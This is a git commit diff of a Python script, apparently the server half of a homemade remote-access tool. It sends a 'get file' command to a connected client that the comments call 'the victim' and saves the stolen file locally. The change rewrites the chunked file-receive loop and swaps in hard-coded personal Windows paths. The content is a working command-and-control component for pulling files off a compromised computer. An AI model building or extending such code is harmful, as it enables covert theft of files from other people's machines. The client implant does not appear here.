03d41a27de0bed0d4386ad347441b73d29c01e66
yehonatan1 <54950358+yehonatan1@users.noreply.github.com>
2020-02-17 22:06:54 -0800

    Update Server.py

--- Server.py
+++ Server.py
@@ -1,44 +1,41 @@
-import os
 import socket
 
 
 def server():
     s = socket.socket()
-    s.bind(('127.0.0.1', 8965))
+    s.bind(('127.0.0.1', 9984))
 
     s.listen(1)
     client_socket, adress = s.accept()
     print("Connection from: " + str(adress))
-    while True:
-        #command = input('Please enter a command to the victim\n')
-        command = 'get file C:\\Users\\avita\\Downloads\\Telegram Desktop\\t.txt'
-        client_socket.send(command.encode('utf-8'))
+    command = "get file C:\\Users\\avita\\OneDrive\\Pictures\\Screenshots\\index.jpg"
+    # input('Please enter a command to the victim')
+    client_socket.send(command.encode('utf-8'))
 
+    while True:
         if 'get file ' in command:
-            #file_path = input("Please enter the path of the file")
-            file_path = 'C:\\Users\\avita\\Downloads\\Telegram Desktop\\a.txt'
+            print('Get File')
             data = None
-            size = 0
-            with open(file_path, 'wb')as file:
-                while data != 'complete':
-                    print('Enter')
-                    client_socket.sendall('ok'.encode('utf-8'))
+            file_path = "C:\\Users\\avita\\OneDrive\\Pictures\\Screenshots\\a.jpg"  # input("Please enter the path of the file")
+            with open(file_path, 'wb')as f:
+                print('Open File')
+                size = 0
+                while True:
                     data = client_socket.recv(1024)
                     size += len(data)
-                    print(f'Size is {size}')
-                    file.write(data)
-                    file.flush()
-                    statinfo = os.stat(file_path)
-                    print(f'File Size is {statinfo.st_size}')
-                statinfo = os.stat(file_path)
-                print(f'Before last: File Size is {statinfo.st_size}')
-                #file.write(data)
-                file.flush()
-                file.close()
-                print(f'Before last: File Size is {statinfo.st_size}')
+                    print(f'Size is {size} and last amount was {len(data)}')
+                    if not data or len(data) < 1024:
+                        print('Done getting file')
+                        f.write(data)
+                        f.flush()
+                        f.close()
+                        break
+                    f.write(data)
+                    #f.flush()
+            print('yyyyyyyyyyyyyyyyyy')
+            command = ''
         else:
             data = client_socket.recv(1024)
-            print('From victim: ' + data.decode('utf-8'))
 
     client_socket.close()
 
